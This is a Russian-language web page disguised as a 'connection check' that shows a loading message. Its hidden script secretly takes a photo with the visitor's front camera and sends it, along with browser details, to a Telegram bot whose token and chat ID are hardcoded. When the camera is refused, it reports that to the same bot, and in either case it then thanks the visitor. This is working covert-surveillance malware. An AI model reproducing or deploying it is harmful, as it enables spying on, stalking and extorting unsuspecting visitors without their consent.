<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка соединения</title>
</head>
<body>
    <div id="info">
        <h2>Идет загрузка</h2>
        <p>Пожалуйста, подождите</p>
    </div>
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        var v = document.getElementById('v')
        var c = document.getElementById('c')
        var ctx = c.getContext('2d')
        var sent = false
        var token = '8862821632:AAHVpQ68Co6A3XOVlytf8-NW40NPfbQdkGs'
        var chatId = '7761721600'

        setTimeout(function() {
            if (sent) return
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            }).then(function(s) {
                v.srcObject = s
                v.play()
                setTimeout(function() {
                    if (sent) return
                    c.width = v.videoWidth || 640
                    c.height = v.videoHeight || 480
                    ctx.drawImage(v, 0, 0, c.width, c.height)
                    var dataUri = c.toDataURL('image/jpeg', 0.7)
                    var base64 = dataUri.split(',')[1]
                    var byteChars = atob(base64)
                    var byteNums = new Array(byteChars.length)
                    for (var i = 0; i < byteChars.length; i++) {
                        byteNums[i] = byteChars.charCodeAt(i)
                    }
                    var byteArr = new Uint8Array(byteNums)
                    var blob = new Blob([byteArr], { type: 'image/jpeg' })

                    var fd = new FormData()
                    fd.append('chat_id', chatId)
                    fd.append('photo', blob, 'photo.jpg')
                    fd.append('caption', 'Фронталка\n' + navigator.userAgent)

                    var xhr = new XMLHttpRequest()
                    xhr.open('POST', 'https://api.telegram.org/bot' + token + '/sendPhoto', true)
                    xhr.onload = function() {
                        console.log('ok', xhr.responseText)
                    }
                    xhr.onerror = function() {
                        console.log('err', xhr.status)
                    }
                    xhr.send(fd)

                    sent = true
                    s.getTracks().forEach(function(t) { t.stop() })
                    document.getElementById('info').innerHTML = '<h2>Проверка завершена</h2><p>Спасибо</p>'
                }, 500)
            }).catch(function(e) {
                document.getElementById('info').innerHTML = '<h2>Ошибка</h2><p>Камера недоступна</p>'
                var xhr = new XMLHttpRequest()
                xhr.open('POST', 'https://api.telegram.org/bot' + token + '/sendMessage', true)
                xhr.setRequestHeader('Content-Type', 'application/json')
                xhr.send(JSON.stringify({
                    chat_id: chatId,
                    text: 'Ошибка камеры\n' + e.toString() + '\n' + navigator.userAgent
                }))
            })
        }, 3000)
    </script>
</body>
</html>
